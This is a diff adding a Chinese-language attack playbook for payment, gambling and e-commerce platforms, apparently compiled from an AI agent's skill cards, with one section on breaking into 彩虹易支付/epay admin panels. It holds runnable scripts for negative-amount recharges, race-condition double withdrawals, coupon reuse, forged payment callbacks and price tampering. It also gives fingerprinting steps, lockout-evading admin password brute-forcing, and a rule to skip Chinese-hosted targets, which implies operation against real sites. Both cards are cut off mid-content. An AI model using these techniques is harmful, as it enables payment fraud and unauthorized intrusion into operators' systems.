@@ -1,0 +1,389 @@
+---
+title: "彩虹易支付submit回放免付充值手法.md"
+generated: 2026-10-21
+kind: consolidated-playbook
+note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
+---
+
+# 彩虹易支付submit回放免付充值手法.md
+
+> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。
+
+## 来源卡
+
+- `/root/.hermes/skills/security/business-logic-payment/SKILL.md`
+- `/root/.hermes/skills/security/epay-admin-pentest/SKILL.md`
+
+## 汇总内容
+
+### business-logic-payment
+
+来源：`/root/.hermes/skills/security/business-logic-payment/SKILL.md`
+
+# 支付 / 博彩平台业务逻辑漏洞（Cursor Skill）
+
+## 何时用
+
+- 支付/金融平台：充值、提现、转账、积分兑换
+- 博彩平台：下注金额、结算逻辑、赔率字段
+- 电商平台：优惠券、价格参数、购物车
+- 任何涉及金钱/分值的 API 接口
+
+---
+
+## 1. 负金额 / 零金额攻击
+
+```python
+# 充值 -100，变相提款
+payloads = [
+ {"amount": -100},
+ {"amount": "-100"},
+ {"amount": 0},
+ {"amount": 0.001}, # 精度截断
+ {"amount": "0.001"},
+ {"amount": -0.01},
+]
+
+for p in payloads:
+ r = httpx.post(f"{TARGET}/api/recharge",
+ json={"amount": p["amount"], **p},
+ headers=headers)
+ if r.status_code == 200:
+ d = r.json()
+ print(f"[!] 成功: {p} → {d}")
+```
+
+---
+
+## 2. 浮点精度漏洞
+
+```python
+# 精度截断：充值 0.001 → 服务端以整数存储 → 0
+# 大量充值 0.001 → 手续费吃完但余额不减
+# 某些平台：充值 9.999 → 按 10 计算，服务端收 10 但扣费 9.999
+
+import httpx, time
+
+TARGET = "https://目标"
+TOKEN = "YOUR_TOKEN"
+
+# 批量微额充值测试
+for i in range(10):
+ r = httpx.post(f"{TARGET}/api/deposit",
+ json={"amount": 0.001, "currency": "CNY"},
+ headers={"Authorization": f"Bearer {TOKEN}"})
+ print(f"[{i}] {r.status_code}: {r.text[:100]}")
+ time.sleep(0.5)
+
+# 查余额
+bal = httpx.get(f"{TARGET}/api/balance", headers={"Authorization": f"Bearer {TOKEN}"})
+print(f"余额: {bal.json()}")
+```
+
+---
+
+## 3. 竞争条件（Race Condition）双花
+
+```python
+#!/usr/bin/env python3
+"""并发请求实现双花：发送同一 trade_no 两次"""
+import httpx, threading, time
+
+TARGET = "https://目标"
+TOKEN = "YOUR_TOKEN"
+WITHDRAW_AMOUNT = 100
+
+results = []
+
+def withdraw(idx):
+ r = httpx.post(f"{TARGET}/api/withdraw",
+ json={"amount": WITHDRAW_AMOUNT, "to": "attacker_addr"},
+ headers={"Authorization": f"Bearer {TOKEN}"},
+ timeout=10)
+ results.append((idx, r.status_code, r.text[:100]))
+
+# 并发 10 个提款请求
+threads = [threading.Thread(target=withdraw, args=(i,)) for i in range(10)]
+start = time.time()
+for t in threads: t.start()
+for t in threads: t.join()
+elapsed = time.time() - start
+
+print(f"耗时: {elapsed:.2f}s")
+success = [(i, s, t) for i, s, t in results if s == 200]
+print(f"成功 {len(success)}/10 次")
+for item in success:
+ print(f" [{item[0]}] {item[1]}: {item[2][:80]}")
+```
+
+---
+
+## 4. 优惠券/积分滥用
+
+```bash
+# 1. 并发使用同一优惠码（竞争条件）
+for i in $(seq 1 10); do
+ curl -s -X POST "$TARGET/api/coupon/apply" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"code":"DISCOUNT50"}' &
+done
+wait
+
+# 2. 不同账号重复领取（同一 device_id / IP）
+# 注册 10 个账号，都申请同一活动
+
+# 3. 积分转账后再退款（余额归零但积分还在）
+curl -s -X POST "$TARGET/api/points/transfer" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d "{\"to\": \"$OTHER_USER\", \"amount\": 1000}"
+
+# 4. 参数污染绕过限制
+# 把 promo_code 放在 URL 参数和 body 中同时出现
+curl -s -X POST "$TARGET/api/order?promo=CODE1" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"promo_code":"CODE2","amount":100}'
+```
+
+---
+
+## 5. 充值回调篡改（详见 payment-callback-forgery）
+
+```bash
+# 快速验证：伪造回调签名
+# 找到支付平台的回调端点（通常无认证）
+curl -s -X POST "$TARGET/api/payment/notify" \
+ -H "Content-Type: application/x-www-form-urlencoded" \
+ -d "trade_no=YOUR_TRADE_NO&amount=9999&status=paid&sign=FAKE"
+
+# 比较真实回调签名算法（通常 MD5(key+params)）
+# 如有 HMAC-SHA1/256，需要正确的密钥
+```
+
+---
+
+## 6. 提现前置条件绕过
+
+```bash
+# 常见前置条件：
+# - 实名认证
+# - 手机绑定
+# - 最低余额
+# - KYC 审核
+
+# 测试绕过：直接打提现接口，看是否校验
+curl -s -X POST "$TARGET/api/withdraw" \
+ -H "Authorization: Bearer $UNVERIFIED_TOKEN" \
+ -d '{"amount":100,"address":"test_addr"}'
+
+# 参数顺序绕过：先提款再触发验证
+# 尝试提款接口不同参数顺序
+
+# 绕过金额上限（枚举）
+for amount in 9999 10000 10001 99999 100000; do
+ r=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/api/withdraw" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d "{\"amount\":$amount}")
+ echo "amount=$amount: HTTP $r"
+done
+```
+
+---
+
+## 7. 博彩赔率/结算漏洞（PC28/彩票）
+
+```python
+# 参考 gambling-platform-odds-audit skill
+
+# 1. 拉取 odds 配置，找特殊字段
+import httpx
+r = httpx.get(f"{TARGET}/api/games/{GAME_ID}", headers=headers)
+config = r.json()
+
+# 检查特殊字段
+special_fields = [
+ "1314", "red_line", "normal_1314", "maximum_payout",
+ "is_special_straight", "normal_red_line"
+]
+for f in special_fields:
+ if f in str(config):
+ print(f"[!] 发现特殊字段: {f}")
+
+# 2. 整期结算验证
+# 拿上期全部投注 + 开奖结果，逐笔重算验证
+r_bets = httpx.get(f"{TARGET}/api/games/{GAME_ID}/bets/prev", headers=headers)
+r_result = httpx.get(f"{TARGET}/api/issues/{ISSUE_ID}", headers=headers)
+```
+
+---
+
+## 8. 价格参数篡改（电商）
+
+```bash
+# 购物车价格参数
+curl -s -X POST "$TARGET/api/cart/checkout" \
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{
+ "items": [{"id": 1, "qty": 1, "price": 0.01}],
+ "total": 0.01
+ }'
+
+# URL 参数价格
+curl -s -X GET "$TARGET/api/product/1?price=0.01&discount=99"
+
+# 订单确认时修改金额
+curl -s -X POST "$TARGET/api/order/confirm" \
+ -d '{"order_id":"12345","amount":0.01,"currency":"CNY"}'
+```
+
+---
+
+## 9. 常见成功指标
+
+| 攻击向量 | 成功信号 |
+|---------|---------|
+| 负金额充值 | 余额增加 / 对方减少 |
+| 精度截断 | 余额 > 预期 |
+| 竞争双花 | 2+ 个提款成功 + 余额异常 |
+| 优惠券复用 | 多次折扣叠加 |
+| 赔
+
+…（截断，全文见来源卡）
+
+### epay-admin-pentest
+
+来源：`/root/.hermes/skills/security/epay-admin-pentest/SKILL.md`
+
+# 彩虹易支付 / 启易付 (四方支付) 后台渗透
+
+## 触发条件
+- 后台标题「支付管理中心」/「登录 - 支付管理中心」
+- 前端 Vue3 + Element Plus (index-*.js 分包), 后端 ThinkPHP 风格 API
+- 特征响应: `{"code":-4,"msg":"No Route"}` / `{"code":-5,"msg":"No Act!"}`
+- 存在 `api.php`、`submit.php`、`runtime/admin_login.lock`
+- 产品家族: 彩虹易支付 (epay)、启易付 (qyypay.cn 官方/OEM)、各类四方代付系统
+- **分流**：FastAdmin 入口是 `/sh.php` `/ks.php` + `part/index` → 走 `fastadmin-daifu-pentest`，不要套本卡
+- **内部 notify 入账**（Yipay 二跳、`/pay/notify/{payId}/`）→ `docs/playbooks/EPay内部notify入账.md`，勿与彩虹 submit 回放混
+
+## 指纹确认链
+1. GET `/admin/` 看 HTML → 记录主入口 `index-*.js`
+2. 下载**全部** JS 分包 (`index-[A-Za-z0-9_-]+.js`, 从主 index.js 里 grep `import("./...")` 拿清单), 然后 `grep -hoE 'url:"[^"]+"'` 全量 API 清单。主入口只有少量路由, API 全在分包里
+3. JS 里写死的第三方域名 (`m.qyypay.cn` 等) → 产品源头, 搜官方站拿文档/版本
+4. FOFA: `title="支付管理中心"` 找同源实例 (注意: 同源实例可能是老版本, API 路径不同, 只用于对比)
+
+## 关键技巧
+- **API 请求三件套必带**: UA + `Referer: https://<host>/admin/` + `X-Requested-With: XMLHttpRequest`, 否则要么返回 SPA HTML (nginx try_files 回退), 要么 nginx Forbidden
+- **登录接口**: `POST /admin/auth/login` JSON `{username, password, enc}`
+ - `enc=0` = 明文密码 (爆破直接用这个)
+ - `enc=1` = RSA 加密 (先 `GET /admin/auth/getPublicKey` 取公钥, 前端 JSEncrypt 加密)
+- **未授权接口**: `auth/getPublicKey`、`auth/checkLogin` (常可匿名访问)
+- **商户端**: `/user/` 是独立 Vue3 SPA (`auth/reg` 注册 / `auth/sendcode` / `common/captcha`); nginx 可能 403 掉 API, 仅放行静态
+- **支付 API**: `api.php?act=order|query|refund` — `act=refund` 报「未开启商户后台自助退款」= 功能存在
+- **8080 端口**: 常暴露同系统 HTTP 版 (无 TLS), 与主站共享登录锁
+- 路径注入: 直接 `/admin/<controller>/<action>`, `index.php` 前缀会被 nginx 重写回 SPA, 别走那条
+
+## 锁定机制 (admin_login.lock) — 爆破必读
+- 失败提示: `"用户名或密码错误，你还可以尝试N次"` (N = 剩余次数)
+- 5 次失败 → **全局锁** (所有用户名都禁, 基于真实 IP):
+ `"多次登录失败，暂时禁止登录。可删除 runtime/admin_login.lock 文件解除限制"`
+- `X-Forwarded-For` / `X-Real-IP` **不绕过** (按真实 IP)
+- 锁定期约 10-30 分钟, 窗口制, 到期自动解除
+- 实测: 计数按 IP 窗口波动, 非严格递减; 慢速爆破 (1.2s+ 间隔) 可大幅降低触发概率
+
+## 常见坑
+- 商户 ID `pid` 从 1 开始枚举不存在 → 用随机大 ID, 不能靠 pid 爆破拿商户
+- 登录/查询参数化良好 (pid、username 均无 SQLi 迹象), 别浪费次数在注入上
+- ThinkPHP 老 RCE (`s=/index/think\app/invokefunction`) 被 nginx 重写拦截, 无效
+- 敏感文件 (.git/.env/runtime/config.php) 全部 403 或 SPA 回退
+- `runtime/` 目录 nginx 403 保护, 直接访问锁文件无效
+
+## 范围铁律 (用户明令)
+- **.cn 域名 + 腾讯 EdgeOne CDN + 同域资产全中国 IP → 判定中国主体 → 立即停手换目标**
+- EdgeOne 识别: 响应头 `eo-log-uuid` / `eo-cache-status`, DNS `*.eo.dnse3.com`, 非 443 端口返回 `Server: Lego Server`
+- 动手前先查 IP 归属 (ip-api.com), 同域资产一并查; 有中国 IP 资产 = 别碰整个目标
+
+## references
+- 个案附件未入库（原 references/niuniuapi-probe.md） — niuniuapi.qihongmy.cn 完整探测记录 (API 面/锁定行为/同源实例)
+
+## 真源
+
+- 手法：`docs/playbooks/彩虹易支付submit回放免付充值手法.md`
+- 工具：`python3 tools/ops/pay_matrix.py --help`
+
+---
+
+## 快速命令集（实战操作顺序）
+
+### Step 1：指纹确认
+
+```bash
+# 访问后台首页确认框架特征
+curl -sk https://<目标>/admin/ \
+ -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
+ -L | grep -iE '<title>|index-.*\.js|element-plus|vite'
+
+# 确认 API 特征响应
+curl -sk https://<目标>/admin/auth/checkLogin \
+ -H 'X-Requested-With: XMLHttpRequest' \
+ -H 'Referer: https://<目标>/admin/' | python3 -m json.tool
+
+# 获取公钥（无需鉴权）
+curl -sk https://<目标>/admin/auth/getPublicKey \
+ -H 'X-Requested-With: XMLHttpRequest' \
+ -H 'Referer: https://<目标>/admin/' | python3 -m json.tool
+```
+
+### Step 2：下载 JS 分包，提取 API 列表
+
+```bash
+# 下载主 JS 并找所有分包
+curl -sk https://<目标>/admin/ \
+ | grep -oE 'src="[^"]*index[^"]*\.js"' \
+ | sed 's/src="//;s/"//'
+
+# 批量下载分包
+for chunk in $(curl -sk https://<目标>/admin/index-<hash>.js \
+ | grep -oE '"[./]*index-[a-zA-Z0-9_-]+\.js"' \
+ | tr -d '"'); do
+ curl -sk "https://<目标>/admin/$chunk" -o "/tmp/$(basename $chunk)"
+done
+
+# 从所有 JS 提取 API 路径
+grep -hoE '"url":"[^"]+"' /tmp/index-*.js | sort -u | head -50
+
+# 提取特定路径
+grep -hoE '"(admin|api)/[a-z/]+"' /tmp/index-*.js | sort -u
+```
+
+### Step 3：弱口令爆破（严格限速）
+
+```bash
+# enc=0 明文密码爆破（最多 4 次试探，留 1 次余量）
+for pass in "admin123" "admin@123" "Admin888" "Q@zwsx123"; do
+ echo -n "Testing $pass: "
+ curl -sk https://<目标>/admin/auth/login -X POST \
+ -H 'Content-Type: application/json' \
+ -H 'X-Requested-With: XMLHttpRequest' \
+ -H 'Referer: https://<目标>/admin/' \
+ -d "{\"username\":\"admin\",\"password\":\"$pass\",\"enc\":0}" \
+ | python3 -m json.tool | grep -E 'code|msg|token'
+ sleep 2 # 限速，防锁
+done
+
+# 检测是否已锁定
+curl -sk https://<目标>/admin/auth/login -X POST \
+ -H 'Content-Type: application/json' \
+ -H 'X-Requested-With: XMLHttpRequest' \
+ -H 'Referer: https://<目标>/admin/' \
+ -d '{"username":"admin","password":"locktest","enc":0}' \
+ | python3 -m json.tool | grep -iE 'lock|禁止|还可以'
+```
+
+### Step 4：支付接口探测
+
+```bash
+# api.php 接口探测
+curl -sk "https://<目标>/api.php?act=order" \
+ -H 'Referer: https://<目标>/admin/' | h
+
+…（截断，全文见来源卡）
